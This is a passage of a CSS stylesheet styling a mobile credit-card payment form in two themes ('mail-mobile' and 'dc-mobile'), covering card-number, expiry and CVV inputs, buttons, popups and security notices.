	min-width: 300px
}

.pay-card_type_mail-mobile .pay-card__row {
	padding: 0
}

.pay-card-layout_type_mail-mobile .pay-card-layout__header {
	min-width: 300px;
	text-align: left;
	margin: 0 auto;
	padding: 15px
}

.pay-card-layout_type_mail-mobile .pay-card-layout__header .pay-card-layout_logo {
	padding-bottom: 15px
}

.pay-card_type_mail-mobile .pay-card__message {
	text-align: left;
	color: #333;
	margin-bottom: 24px
}

.pay-card_type_mail-mobile .pay-card__card-selector {
	position: relative;
	width: auto;
	margin: 0
}

.pay-card_type_mail-mobile .pay-card__card-selector.pay-card__card-selector_type_hidden {
	display: none!important
}

.pay-card_type_mail-mobile .pay-card__select-card {
	display: block
}

.pay-card_type_mail-mobile .pay-card__select-card .control {
	margin-right: 0
}

.pay-card_type_mail-mobile .pay-card__select-card .control__select {
	width: 100%;
	height: 48px;
	padding: 7px 4px;
	margin: 0 0 24px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border-radius: 2px;
	background: #fff;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	border-color: rgba(0, 0, 0, .12);
	color: #333;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 15px;
	padding-left: 12px;
	text-transform: none;
	letter-spacing: normal;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_mail-mobile .pay-card__card {
	width: auto
}

.pay-card_type_mail-mobile .pay-card__card_type_added-card {
	padding-top: 0
}

.pay-card_type_mail-mobile .pay-card__card_type_added-card .payment-systems-icons {
	top: -97px
}

.pay-card_type_mail-mobile .credit-card-form__card-wrapper {
	position: relative
}

.pay-card_type_mail-mobile .credit-card-form__form {
	padding: 0;
	text-align: left
}

.pay-card_type_mail-mobile .credit-card-form__card_position_front {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: auto;
	height: auto;
	margin: 0;
	padding: 0;
	background: none;
	border-radius: 0;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_mail-mobile .payment-systems-icons {
	position: absolute;
	right: 0;
	top: 0;
	height: 20px;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-align: center;
	-webkit-align-items: center;
	align-items: center
}

.pay-card_type_mail-mobile .payment-systems-icons .payment-systems-icon_name_mir,
.pay-card_type_mail-mobile .payment-systems-icons .payment-systems-icon_name_visa {
	top: 0
}

.pay-card_type_mail-mobile .payment-systems-icon {
	margin: 0 0 0 5px;
	float: none
}

.pay-card_type_mail-mobile .credit-card-form__label {
	position: relative;
	text-transform: none
}

.pay-card_type_mail-mobile .credit-card-form__label-group_type_card-number,
.pay-card_type_mail-mobile .credit-card-form__label-group_type_expiration-date,
.pay-card_type_mail-mobile .credit-card-form__label-group_type_holder-name,
.pay-card_type_mail-mobile .credit-card-form__label-group_type_payment-amount {
	margin: 0 0 24px;
	padding: 0
}

.pay-card_type_mail-mobile .credit-card-form__label-group_type_payment-amount .credit-card-form__placeholder {
	position: absolute;
	right: 12px;
	top: 28px;
	color: #999;
	font-size: 15px;
	-webkit-transform: translateY(50%);
	-o-transform: translateY(50%);
	transform: translateY(50%)
}

.pay-card_type_mail-mobile .control-label__text,
.pay-card_type_mail-mobile .credit-card-form__title {
	display: block;
	margin: 0 0 5px;
	text-transform: none;
	font-size: 13px;
	font-weight: 700;
	color: #333;
	line-height: 20px
}

.pay-card_type_mail-mobile .credit-card-form__input {
	height: 48px;
	background: #fff;
	border-color: rgba(0, 0, 0, .12);
	color: #333;
	border-radius: 2px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 15px;
	padding-left: 12px;
	text-transform: none;
	letter-spacing: normal;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_mail-mobile .credit-card-form__input::-webkit-input-placeholder {
	color: #999
}

.pay-card_type_mail-mobile .credit-card-form__input::-moz-placeholder {
	color: #999
}

.pay-card_type_mail-mobile .credit-card-form__input::placeholder {
	color: #999
}

.pay-card_type_mail-mobile .credit-card-form__input:disabled {
	opacity: 1;
	color: #999;
	border-color: rgba(0, 0, 0, .12);
	-webkit-text-fill-color: #999;
	background: #f7f7f7
}

.pay-card_type_mail-mobile .pay-card__card_type_added-card .credit-card-form__label-group_type_card-number {
	display: none
}

.pay-card_type_mail-mobile.pay-card_type_mail-mobile_theme_theme1 .pay-card__card_type_added-card .credit-card-form__label-group_type_card-number,
.pay-card_type_mail-mobile.pay-card_type_mail-mobile_theme_theme2 .pay-card__card_type_added-card .credit-card-form__label-group_type_card-number {
	display: block!important
}

.pay-card_type_mail-mobile .credit-card-form__title_type_expiration-date {
	display: none
}

.pay-card_type_mail-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	width: 50%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	padding-right: 6px
}

.pay-card_type_mail-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card_type_mail-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	margin-left: 0;
	width: 100%
}

.pay-card_type_mail-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__label_type_cvv {
	padding: 0 0 0 6px
}

.pay-card_type_mail-mobile .credit-card-form__cvv-icon,
.pay-card_type_mail-mobile .credit-card-form__cvv-icon:hover,
.pay-card_type_mail-mobile .credit-card-form__label_type_cvv:hover .credit-card-form__cvv-icon {
	height: 16px;
	width: 16px
}

.pay-card_type_mail-mobile .credit-card-form__cvv-icon {
	position: absolute;
	top: auto;
	right: 12px;
	bottom: 24px;
	-webkit-transform: translateY(50%);
	-o-transform: translateY(50%);
	transform: translateY(50%);
	border-radius: 8px;
	background-image: none;
	background-color: #333;
	text-align: center;
	color: #fff;
	cursor: pointer
}

.pay-card_type_mail-mobile .credit-card-form__label_error_yes .credit-card-form__cvv-icon,
.pay-card_type_mail-mobile .credit-card-form__label_error_yes .credit-card-form__tooltip_visible_yes {
	display: none
}

.pay-card_type_mail-mobile .credit-card-form__cvv-icon:before {
	display: inline-block;
	content: "?";
	font-size: 13px;
	line-height: 16px;
	vertical-align: top
}

.pay-card_type_mail-mobile .credit-card-form__terms {
	text-align: center;
	margin-top: 12px;
	-webkit-text-size-adjust: 100%;
	text-size-adjust: 100%
}

.pay-card_type_mail-mobile .credit-card-form__terms-link {
	color: #005bd1;
	white-space: nowrap
}

.pay-card_type_mail-mobile .credit-card-form__error-text {
	font-size: 15px;
	color: #f44e4e;
	position: static
}

.pay-card_type_mail-mobile .credit-card-form__label_type_cvv .credit-card-form__error-text {
	display: none;
	width: auto;
	margin-top: 2px;
	position: absolute
}

.pay-card_type_mail-mobile .credit-card-form__label_type_cvv.credit-card-form__label_error_yes {
	margin-bottom: 24px
}

.pay-card_type_mail-mobile .credit-card-form__label_type_cvv .credit-card-form__input,
.pay-card_type_mail-mobile .credit-card-form__label_type_cvv .credit-card-form__title {
	width: 100%
}

.pay-card_type_mail-mobile .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	border: 1px solid #f44e4e
}

.pay-card_type_mail-mobile .credit-card-form__label_error_yes .credit-card-form__error-text {
	display: block
}

.pay-card-layout_type_mail-mobile .credit-card-form__popup .button,
.pay-card_type_mail-mobile .credit-card-form__submit .button {
	color: #fff;
	border: 1px solid;
	border-color: rgba(0, 0, 0, .12);
	border-radius: 2px;
	-webkit-box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #005ff9;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	width: 100%;
	height: 48px;
	margin: 0;
	line-height: 48px;
	font-size: 15px;
	font-weight: 700;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none;
	box-sizing: border-box;
	text-transform: none
}

.pay-card-layout_type_mail-mobile .credit-card-form__popup .button:hover,
.pay-card_type_mail-mobile .credit-card-form__submit .button:hover {
	border: 1px solid;
	border-color: rgba(0, 0, 0, .12);
	-webkit-box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #005aee
}

.pay-card-layout_type_mail-mobile .credit-card-form__popup .button:active,
.pay-card_type_mail-mobile .credit-card-form__submit .button:active {
	-webkit-box-shadow: inset 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: inset 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #0057e4
}

.pay-card-layout_type_mail-mobile .credit-card-form__popup .button.button_disabled_yes,
.pay-card_type_mail-mobile .credit-card-form__submit .button.button_disabled_yes {
	border-radius: 2px
}

.pay-card-layout_type_mail-mobile .credit-card-form__popup .button.button_disabled_yes,
.pay-card-layout_type_mail-mobile .credit-card-form__popup .button.button_disabled_yes:active,
.pay-card-layout_type_mail-mobile .credit-card-form__popup .button.button_disabled_yes:hover,
.pay-card_type_mail-mobile .credit-card-form__submit .button.button_disabled_yes,
.pay-card_type_mail-mobile .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card_type_mail-mobile .credit-card-form__submit .button.button_disabled_yes:hover {
	background: #005ff9;
	color: #fff;
	cursor: default;
	opacity: .4
}

.pay-card-layout_type_mail-mobile .credit-card-form__popup-body {
	-webkit-font-smoothing: antialiased;
	padding: 15px;
	height: 100%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.body_background_mail-mobile .notification-block .title,
.pay-card-layout_type_mail-mobile .credit-card-form__popup .info-block .title {
	margin: 0 0 25px;
	font-size: 20px;
	line-height: 24px;
	color: #333
}

.body_background_mail-mobile .info-block .paragraph,
.pay-card-layout_type_mail-mobile .credit-card-form__popup .info-block .paragraph {
	margin: 0 0 35px;
	font-size: 15px;
	line-height: 20px;
	color: #999
}

.pay-card-layout_type_mail-mobile .credit-card-form__popup .info-block .paragraph_color_red {
	color: #999
}

.pay-card-layout_type_mail-mobile .credit-card-form__popup .notification-block .payment-info-table-wrapper {
	padding: 0 20px;
	background: #fff;
	border-top: 1px solid #ebebeb;
	border-bottom: 1px solid #ebebeb
}

.pay-card-layout_type_mail-mobile .credit-card-form__popup .notification-block .payment-info-table {
	padding: 0;
	border-top: none
}

.pay-card-layout_type_mail-mobile .credit-card-form__popup .notification-block .payment-info-table__caption {
	border-top: none;
	border-bottom: none
}

.pay-card-layout_type_mail-mobile .credit-card-form__popup .notification-block .payment-info-table,
.pay-card-layout_type_mail-mobile .credit-card-form__popup .notification-block .payment-info-table__caption {
	background: #fff
}

.pay-card-layout_type_mail-mobile .credit-card-form__popup .notification-block .payment-info-table__caption,
.pay-card-layout_type_mail-mobile .credit-card-form__popup .notification-block .payment-info-table__head {
	padding: 15px 0;
	font-size: 16px;
	line-height: 24px;
	color: #333
}

.pay-card-layout_type_mail-mobile .credit-card-form__popup .notification-block .payment-info-table__head {
	border-top: 1px solid #ebebeb
}

.pay-card-layout_type_mail-mobile .credit-card-form__popup .notification-block .payment-info-table__cell {
	padding: 15px 0;
	font-size: 15px;
	line-height: 22px;
	color: #999;
	border-top: 1px solid #ebebeb;
	text-align: right
}

.pay-card_type_mail-mobile .credit-card-form__tooltip {
	left: auto;
	right: 0;
	top: 0;
	-webkit-transform: translateY(-100%);
	-o-transform: translateY(-100%);
	transform: translateY(-100%);
	width: 280px;
	padding: 15px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	color: #333;
	background-color: #fff;
	-webkit-box-shadow: 0 4px 20px 0 rgba(0, 0, 0, .16);
	box-shadow: 0 4px 20px 0 rgba(0, 0, 0, .16);
	border-radius: 2px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 13px;
	line-height: 18px;
	text-align: left;
	white-space: normal
}

.pay-card_type_mail-mobile .credit-card-form__tooltip-arrow {
	right: 8px;
	border: solid transparent;
	content: "";
	height: 0;
	width: 0;
	pointer-events: none;
	border-top-color: #fff;
	border-width: 12px;
	margin-left: 0
}

.pay-card_type_mail-mobile .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-icon {
	display: none
}

.pay-card_type_mail-mobile .notification-block .payment-info-table__caption {
	padding: 10px 0;
	border-bottom: 1px solid hsla(0, 0%, 59%, .4);
	background-color: #f2f2f2
}

.pay-card_type_mail-mobile .notification-block .payment-info-table {
	background-color: #f2f2f2
}

.pay-card_type_mail-mobile .notification-block .payment-info-table .grid-table__row:last-child .payment-info-table__cell,
.pay-card_type_mail-mobile .notification-block .payment-info-table .grid-table__row:last-child .payment-info-table__head {
	padding-bottom: 15px
}

.pay-card_type_mail-mobile .pay-card__card-selector:before {
	position: absolute;
	top: 45px;
	display: block;
	right: 12px;
	width: 0;
	height: 0;
	z-index: 1;
	content: "";
	pointer-events: none;
	border: solid transparent;
	border-top-color: #333;
	border-width: 6px 4px
}

.secure-information_type_mail-mobile {
	background: none;
	text-align: center;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	font-size: 15px;
	color: #999;
	-webkit-font-smoothing: antialiased;
	width: 100%;
	max-width: 360px;
	margin: 0 auto
}

.secure-information_type_mail-mobile.secure-information .protection-icons {
	margin: 0
}

.secure-information_type_mail-mobile .secure-information__icon {
	display: none
}

.secure-information_type_mail-mobile .secure-information__text {
	font-size: inherit;
	margin-bottom: 13px;
	display: inline-block;
	line-height: 20px
}

.secure-information_type_mail-mobile .secure-information__text_type_protocol {
	margin-right: 5px;
	color: #10b800
}

.pay-card-layout_type_mail-mobile .credit-card-form__input,
.pay-card-layout_type_mail-mobile .credit-card-form__placeholder,
.pay-card-layout_type_mail-mobile .credit-card-form__submit .button {
	font-family: Roboto, Arial, sans-serif
}

.pay-card-layout_type_dc-mobile .info-block_type_session-countdown-timer,
.pay-card_type_dc-mobile,
.secure-information_type_dc-mobile {
	min-width: 320px
}

.pay-card_type_dc-mobile {
	position: relative;
	font-size: 15px;
	line-height: 20px;
	-webkit-font-smoothing: antialiased
}

.pay-card_type_dc-mobile,
.pay-card_type_dc-mobile .pay-card__card {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_dc-mobile .pay-card__card {
	margin: 0 auto 16px;
	padding: 0 16px;
	width: auto;
	max-width: 360px
}

.pay-card_type_dc-mobile .pay-card__row {
	padding-top: 0
}

.pay-card_type_dc-mobile .pay-card__card-selector {
	width: 100%;
	margin: 0 auto 24px;
	position: relative
}

.pay-card_type_dc-mobile .pay-card__select-card .control-label__text {
	display: none
}

.pay-card_type_dc-mobile .pay-card__select-card .control {
	margin-right: 0
}

.pay-card_type_dc-mobile .pay-card__select-card {
	width: 100%
}

.pay-card_type_dc-mobile .control__select {
	display: inline-block;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none;
	font-family: Roboto, arial, helvetica;
	font-size: 17px;
	line-height: 56px;
	padding: 0 16px;
	color: #919399;
	border-color: rgba(34, 34, 34, .08);
	border-width: 1px 0;
	border-radius: 0;
	background: #fff;
	height: 56px;
	width: 100%
}

.pay-card_type_dc-mobile .pay-card__select-card .control-label {
	width: 100%;
	position: relative
}

.pay-card_type_dc-mobile .pay-card__card-selector:before {
	position: absolute;
	content: "";
	background: #fff;
	top: 50%;
	right: 23px;
	width: 9px;
	height: 9px;
	border: solid #919399;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg) translate(-50%, -50%);
	-o-transform: rotate(45deg) translate(-50%, -50%);
	transform: rotate(45deg) translate(-50%, -50%);
	pointer-events: none;
	z-index: 1
}

.pay-card_type_dc-mobile .pay-card__remove-card {
	color: #0ec645;
	position: absolute;
	top: 245px;
	z-index: 3;
	left: 50%;
	-webkit-transform: translateX(-128px);
	-o-transform: translateX(-128px);
	transform: translateX(-128px)
}

.pay-card_type_dc-mobile .credit-card-form__card-wrapper {
	position: relative;
	margin-bottom: 20px
}

.pay-card_type_dc-mobile .credit-card-form__form {
	padding: 0;
	text-align: left;
	position: relative
}

.pay-card_type_dc-mobile .credit-card-form__card_position_front {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: 100%;
	height: 204px;
	padding: 16px;
	background: #f6f6f6;
	border-radius: 4px;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_dc-mobile .payment-systems-icons {
	top: 0;
	margin: 0 0 16px;
	float: left
}

.pay-card_type_dc-mobile .payment-systems-icons .payment-systems-icon_name_visa {
	top: 0
}

.pay-card_type_dc-mobile .payment-systems-icon {
	float: right;
	margin: 0 16px 0 0
}

.pay-card_type_dc-mobile .payment-systems-icon.payment-systems-icon_name_mir,
.pay-card_type_dc-mobile .payment-systems-icon.payment-systems-icon_name_visa {
	top: 3px
}

.pay-card_type_dc-mobile .credit-card-form__label-group {
	clear: both
}

.pay-card_type_dc-mobile .credit-card-form__input {
	height: 40px;
	background: #fff;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	display: inline-block;
	margin: 0;
	color: #2e2f33;
	border: 0;
	padding-left: 10px;
	font-size: 14px;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_dc-mobile .credit-card-form__input:focus {
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_dc-mobile .credit-card-form__input:disabled {
	background: #fff;
	color: #e4e5e6;
	opacity: 1;
	-webkit-text-fill-color: #e4e5e6
}

.pay-card_type_dc-mobile .credit-card-form__input::-webkit-input-placeholder {
	color: #2e2f33
}

.pay-card_type_dc-mobile .credit-card-form__input::-moz-placeholder {
	color: #2e2f33
}

.pay-card_type_dc-mobile .credit-card-form__input::placeholder {
	color: #2e2f33
}

.pay-card_type_dc-mobile .credit-card-form__title {
	display: inline-block;
	width: 55px;
	margin: 0;
	padding-right: 8px;
	white-space: pre-wrap;
	text-transform: none;
	font-size: 15px;
	line-height: 20px;
	float: left;
	color: #919399
}

.pay-card_type_dc-mobile .credit-card-form__label-group_type_card-number {
	margin: 0 0 16px;
	padding: 0
}

.pay-card_type_dc-mobile .credit-card-form__label-group_type_card-number .credit-card-form__input {
	width: 193px;
	width: -webkit-calc(100% - 63px);
	width: calc(100% - 63px)
}

.pay-card_type_dc-mobile .credit-card-form__label_type_cvv {
	margin: 0 0 0 16px
}

.pay-card_type_dc-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__input {
	width: 72px
}

.pay-card_type_dc-mobile .credit-card-form__label_type_cvv .credit-card-form__input {
	width: 50px
}

.pay-card_type_dc-mobile .credit-card-form__label_type_cvv .credit-card-form__title {
	padding-right: 0
}

.pay-card_type_dc-mobile .credit-card-form__label-group_type_expiration-date {
	margin: 0
}

.pay-card_type_dc-mobile .credit-card-form__label-group_type_add-card {
	position: absolute;
	top: 166px;
	left: 19px;
	z-index: 2
}

.pay-card_type_dc-mobile .credit-card-form__label-group_type_add-card .credit-card-form__label {
	font-size: 15px;
	line-height: 20px;
	color: #919399
}

.pay-card_type_dc-mobile .credit-card-form__label-group_type_add-card .credit-card-form__input {
	display: none
}

.pay-card_type_dc-mobile [type=checkbox]+.credit-card-form__input-icon {
	display: inline-block;
	margin-right: 10px;
	vertical-align: top;
	width: 16px;
	height: 16px;
	border: 2px solid #919399;
	border-radius: 4px
}

.pay-card_type_dc-mobile [type=checkbox]:checked+.credit-card-form__input-icon {
	background: #2e2f33;
	border-color: #2e2f33
}

.pay-card_type_dc-mobile [type=checkbox]:checked+.credit-card-form__input-icon:after {
	content: "";
	display: block;
	margin: auto;
	width: 4px;
	height: 12px;
	border: solid #fff;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg);
	-o-transform: rotate(45deg);
	transform: rotate(45deg)
}

.pay-card_type_dc-mobile .credit-card-form__terms {
	text-align: center;
	font-size: 15px;
	line-height: 20px;
	color: #919399;
	padding: 16px 0 0
}

.pay-card_type_dc-mobile .credit-card-form__terms-link {
	text-decoration: none;
	color: #0ec645
}

.pay-card_type_dc-mobile .credit-card-form__label .credit-card-form__error-text {
	display: none
}

.pay-card_type_dc-mobile .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	border: 1px solid #f36
}

.pay-card_type_dc-mobile .credit-card-form__submit {
	margin-top: 0
}

.pay-card-layout_type_dc-mobile .credit-card-form__popup .button,
.pay-card_type_dc-mobile .credit-card-form__submit .button {
	color: #fff;
	border-radius: 4px;
	background: #0ec645;
	height: 44px;
	line-height: 44px;
	margin: 0;
	font-size: 15px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	text-transform: none;
	width: 100%;
	font-weight: 400;
	text-align: center
}

.pay-card-layout_type_dc-mobile .credit-card-form__popup .button:hover,
.pay-card_type_dc-mobile .credit-card-form__submit .button:hover {
	background: #13ae35
}

.pay-card-layout_type_dc-mobile .credit-card-form__popup .button:active,
.pay-card_type_dc-mobile .credit-card-form__submit .button:active {
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .06)), to(rgba(0, 0, 0, .06))) #0ec645;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .06), rgba(0, 0, 0, .06)) #0ec645;
	background: -o-linear-gradient(rgba(0, 0, 0, .06), rgba(0, 0, 0, .06)) #0ec645;
	background: linear-gradient(rgba(0, 0, 0, .06), rgba(0, 0, 0, .06)) #0ec645
}

.pay-card_type_dc-mobile .credit-card-form__submit .button:hover {
	text-decoration: none
}

.pay-card_type_dc-mobile .credit-card-form__submit .button__light {
	border-radius: 4px;
	color: #2e2f33;
	background: #f6f6f6;
	font-weight: 400;
	text-transform: none
}

.pay-card_type_dc-mobile .credit-card-form__submit .button__light:hover {
	color: #000;
	background: #f6f6f6
}

.pay-card_type_dc-mobile .credit-card-form__submit .button__light:active {
	color: #000;
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .05)), to(rgba(0, 0, 0, .05))) #f6f6f6;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #f6f6f6;
	background: -o-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #f6f6f6;
	background: linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #f6f6f6
}

.pay-card_type_dc-mobile .credit-card-form__currency {
	font-size: 20px
}

.pay-card_type_dc-mobile .credit-card-form__amount {
	font-size: 20px;
	line-height: 1;
	color: #2e2f33;
	text-align: center;
	margin-bottom: 20px;
	font-weight: 700
}

.pay-card-layout_type_dc-mobile,
.pay-card-layout_type_dc-mobile .credit-card-form__popup {
	padding-top: 20px;
	-webkit-font-smoothing: antialiased;
	font-family: Roboto, arial, helvetica;
	background-color: #fff
}

.pay-card-layout_type_dc-mobile .clearfix:after,
.pay-card-layout_type_dc-mobile .clearfix:before {
	display: block
}

.pay-card-layout_type_dc-mobile .pay-card-layout__header {
	padding: 28px 0 20px;
	position: relative
}

.pay-card-layout_type_dc-mobile .pay-card-layout__title {
	padding-bottom: 4px;
	text-align: center;
	font-size: 22px;
	line-height: 28px;
	font-weight: 700;
	color: #2e2f33
}

.pay-card-layout_type_dc-mobile .pay-card-layout__wrapper-logo {
	padding-bottom: 17px;
	margin: 0 auto;
	text-align: center;
	height: 36px
}

.pay-card-layout_type_dc-mobile .pay-card-layout__logo {
	display: inline-block;
	margin-left: 34px
}

.pay-card-layout_type_dc-mobile .pay-card-layout__logo:first-child {
	margin-left: 0
}

.pay-card-layout_type_dc-mobile .credit-card-form__popup {
	padding: 20px 16px 0
}

.pay-card-layout_type_dc-mobile .credit-card-form__popup-message {
	color: #fff;
	font-size: 20px;
	line-height: 24px;
	vertical-align: top;
	letter-spacing: -.4px
}

.pay-card-layout_type_dc-mobile .credit-card-form__popup-body {
	height: -webkit-calc(100% - 53px);
	height: calc(100% - 53px);
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: vertical;
	-webkit-box-direction: normal;
	-webkit-flex-direction: column;
	flex-direction: column;
	padding-top: 107px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card-layout_type_dc-mobile .credit-card-form__popup-body .notification-block {
	height: auto
}

.pay-card-layout_type_dc-mobile .credit-card-form__popup-body .notification-block__inner {
	padding: 0
}

.pay-card-layout_type_dc-mobile .credit-card-form__popup-body .credit-card-form__popup-buttons-wrapper {
	margin-top: auto;
	padding-bottom: 18px
}

.pay-card-layout_type_dc-mobile .info-block .paragraph,
.pay-card-layout_type_dc-mobile .notification-block .title {
	line-height: 20px;
	color: #2e2f33;
	margin: 0
}

.pay-card-layout_type_dc-mobile .notification-block .title {
	font-size: 17px;
	font-weight: 600;
	padding-bottom: 8px
}

.pay-card-layout_type_dc-mobile .info-block .paragraph {
	font-size: 15px
}

.pay-card-layout_type_dc-mobile .info-block_type_error {
	position: absolute;
	top: 0;
	left: 0;
	background: #f36;
	text-align: center;
	width: 100%;
	height: auto;
	display: none
}

.pay-card-layout_type_dc-mobile .info-block_type_error .paragraph {
	color: #fff;
	font-size: 15px;
	line-height: 1;
	padding: 4px 0
}

.pay-card-layout_type_dc-mobile .credit-card-form__popup .button {
	display: block;
	margin: 16px auto 0;
	padding: 0 16px
}

.pay-card-layout_type_dc-mobile .credit-card-form__popup-body_type_loader .info-block .img {
	margin-bottom: 24px
}

.pay-card-layout_type_dc-mobile .credit-card-form__popup .button__light {
	border-radius: 4px;
	color: #2e2f33;
	background: #f6f6f6;
	font-weight: 400
}

.pay-card-layout_type_dc-mobile .credit-card-form__popup .button__light:hover {
	color: #000;
	background: #f6f6f6
}

.pay-card-layout_type_dc-mobile .credit-card-form__popup .button__light:active {
	color: #000;
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .05)), to(rgba(0, 0, 0, .05))) #f6f6f6;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #f6f6f6;
	background: -o-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #f6f6f6;
	background: linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #f6f6f6
}

.pay-card-layout_type_dc-mobile .credit-card-form__popup .button:first-child {
	margin-top: 0
}

.pay-card-layout_type_dc-mobile .info-block_type_session-countdown-timer {
	text-align: center;
	font-size: 15px;
	line-height: 1;
	color: #919399
}

.pay-card-layout_type_dc-mobile .info-block_type_session-countdown-timer .info-block__content {
	padding: 0
}

.pay-card-layout_type_dc-mobile .notification-block .payment-info-table {
	width: 270px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background-color: #fff;
	-webkit-box-shadow: 0 4px 4px 0 rgba(0, 0, 0, .1), 0 0 4px 0 rgba(0, 0, 0, .1);
	box-shadow: 0 4px 4px 0 rgba(0, 0, 0, .1), 0 0 4px 0 rgba(0, 0, 0, .1)
}

.pay-card-layout_type_dc-mobile .notification-block .payment-info-table,
.pay-card-layout_type_dc-mobile .notification-block .payment-info-table__caption {
	background: #fff;
	position: relative;
	display: block;
	padding: 20px 16px 0;
	margin-bottom: 30px
}

.pay-card-layout_type_dc-mobile .notification-block .payment-info-table:before {
	position: absolute;
	left: -9px;
	top: -4px;
	z-index: 1;
	content: "";
	font-size: 0;
	line-height: 0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: 288px;
	height: 8px;
	border-radius: 100px;
	background-color: #e4e5e6;
	-webkit-box-shadow: inset 0 1px 8px 0 #73737f;
	box-shadow: inset 0 1px 8px 0 #73737f;
	border: 2px solid rgba(46, 46, 51, .1)
}

.pay-card-layout_type_dc-mobile .notification-block .payment-info-table__caption,
.pay-card-layout_type_dc-mobile .notification-block .payment-info-table__cell,
.pay-card-layout_type_dc-mobile .notification-block .payment-info-table__head {
	font-size: 15px;
	line-height: 20px;
	padding-bottom: 10px;
	vertical-align: top
}

.pay-card-layout_type_dc-mobile .notification-block .payment-info-table__caption {
	position: relative;
	z-index: 2;
	display: block;
	margin: -20px -16px 12px;
	padding: 25px 16px 0;
	color: #2e2f33;
	text-align: left;
	background: #fff
}

.pay-card-layout_type_dc-mobile .notification-block .payment-info-table__head {
	color: #919399;
	text-align: left;
	width: 98px;
	padding-left: 0
}

.pay-card-layout_type_dc-mobile .notification-block .payment-info-table__cell {
	color: #2e2f33;
	padding-left: 0;
	padding-right: 0;
	width: 198px
}

.pay-card-layout_type_dc-mobile .notification-block_status_ok .title {
	padding-bottom: 55px
}

.pay-card-layout_type_dc-mobile .notification-block_status_ok .info-block .paragraph {
	font-size: 17px;
	font-weight: 600;
	line-height: 20px;
	padding-bottom: 8px
}

.pay-card-layout_type_dc-mobile .notification-block_status_ok .button {
	width: auto
}

.pay-card-layout_type_dc-mobile .notification-block_status_ok .paragraph {
	position: relative
}

.pay-card-layout_type_dc-mobile .notification-block_status_ok .paragraph:after {
	position: absolute;
	left: 0;
	top: -24px;
	width: 100%;
	height: 0;
	border-bottom: 1px solid #f6f6f6;
	overflow: hidden;
	content: ""
}

.secure-information_type_dc-mobile {
	text-align: center;
	padding: 16px 0;
	background: none;
	position: relative;
	border-top: 1px solid rgba(34, 34, 34, .08)
}

.secure-information_type_dc-mobile .secure-information__text {
	font-family: Roboto, arial, helvetica;
	display: block;
	font-size: 13px;
	line-height: 16px;
	color: #919399;
	margin-bottom: 10px
}

.secure-information_type_dc-mobile .protection-icons {
	margin-bottom: -5px
}

.secure-information_type_dc-mobile .protection-icons__list-item {
	margin-right: 10px
}

@media screen and (min-width:360px) {
	.pay-card_type_dc-mobile .pay-card__remove-card {
		-webkit-transform: translateX(-148px);
